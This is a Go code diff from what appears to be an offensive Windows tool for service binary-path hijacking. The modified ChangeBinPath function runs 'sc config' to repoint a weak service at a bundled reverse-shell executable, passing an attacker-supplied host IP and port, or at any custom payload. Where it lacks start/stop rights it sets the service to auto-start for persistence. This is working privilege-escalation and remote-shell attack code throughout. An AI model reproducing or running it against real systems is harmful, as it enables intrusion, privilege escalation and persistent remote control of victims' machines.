@@ -5,13 +5,11 @@ import (
 	"os"
 	"os/exec"
 	"strings"
-
-	"github.com/fatih/color"
 )
 
-func ChangeBinPath(serv *WeakServ, choice int) *WeakServ {
+func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 	// Modifies service binary -> return pointer to
-	// modified service
+	// modified service and error if cannot change bin path
 
 	// Hold user home directory and append revshell path to it
 	homeDir, _ := os.UserHomeDir()
@@ -20,21 +18,83 @@ func ChangeBinPath(serv *WeakServ, choice int) *WeakServ {
 	// it lowercase. Idk why this works.
 	homeDir = strings.ToLower(strings.Replace(homeDir, `\`, `/`, -1))
 
-	malPath := fmt.Sprintf(homeDir + `/win-binary-hijacking/internal/malbinaries/revshell.exe`)
+	var cmdFormat string
 
-	// Formatting sc config portion here
-	cmdFormat := fmt.Sprintf(`binpath="%s"`, malPath)
+	switch choice {
+	case 1:
+		var hostIP, hostPort string
 
-	fmt.Println(cmdFormat)
+		m.CD.Println("What is the host IP for the reverse shell?")
 
-	cmd := exec.Command("sc", "config", serv.Name, cmdFormat)
+		r, err := fmt.Scanln(&hostIP)
 
-	err := cmd.Run()
+		if r != 1 || err != nil {
+			panic("Cannot process host IP")
+		}
 
-	if err != nil {
-		color.Red("Error changing binary path for service: %s: %v\n", serv.Name, err)
-	} else {
-		color.Red("Changed binary path for service: %s succesfully", serv.Name)
+		m.CD.Println("What is the port number for the host?")
+		r, err = fmt.Scanln(&hostPort)
+
+		if r != 1 || err != nil {
+			panic("Cannot process host Port")
+		}
+
+		malPath := fmt.Sprintf(homeDir + `/win-binary-hijacking/internal/malbinaries/revshell.exe`)
+
+		// Formatting sc config portion here
+
+		if serv.CanStart && serv.CanStop {
+			cmdFormat = fmt.Sprintf(`binpath=%s %s %s`, malPath, hostIP, hostPort)
+		} else {
+			m.CD.Println("Insufficient permissions to start and stop this service.")
+			m.CD.Println("Setting START_TYPE to AUTO")
+			cmdFormat = fmt.Sprintf(`start=auto binpath=%s %s %s`, malPath, hostIP, hostPort)
+		}
+
+		cmd := exec.Command("sc", "config", serv.Name, cmdFormat)
+
+		err = cmd.Run()
+
+		if err != nil {
+			m.CD.Printf("Error changing binary path for service: %s: %v\n", serv.Name, err)
+		} else {
+			m.CD.Printf("Changed binary path for service: %s succesfully\n", serv.Name)
+			serv.BinPath = malPath
+		}
+
+	case 2:
+		var customBin, cmdFormat string
+
+		m.CD.Println("Please enter FULL path of your custom payload:")
+
+		r, err := fmt.Scanln(&customBin)
+
+		if r != 1 || err != nil {
+			panic("Trouble processing custom binary path")
+		}
+
+		// Formatting sc config portion here
+
+		if serv.CanStart && serv.CanStop {
+			cmdFormat = fmt.Sprintf(`binpath="%s"`, customBin)
+		} else {
+			m.CD.Println("Insufficient permissions to start and stop this service.")
+			m.CD.Println("Setting START_TYPE to AUTO")
+			cmdFormat = fmt.Sprintf(`start=auto binpath="%s"`, customBin)
+
+		}
+
+		cmd := exec.Command("sc", "config", serv.Name, "start=auto", cmdFormat)
+
+		err = cmd.Run()
+
+		if err != nil {
+			m.CD.Printf("Error changing binary path for service: %s: %v\n", serv.Name, err)
+		} else {
+			m.CD.Printf("Changed binary path for service: %s succesfully\n", serv.Name)
+			serv.BinPath = customBin
+		}
+
 	}
 
 	return serv
@@ -48,12 +108,6 @@ func StartServ(serv *WeakServ) error {
 
 	err := cmd.Run()
 
-	if err != nil {
-		color.Red("Could not start service: %s", serv.Name)
-
-	} else {
-		color.Red("Service started")
-	}
 	return err
 }
 
@@ -65,11 +119,5 @@ func StopServ(serv *WeakServ) error {
 
 	err := cmd.Run()
 
-	if err != nil {
-		color.Red("Could not start service: %s", serv.Name)
-
-	} else {
-		color.Red("Service started")
-	}
 	return err
 }
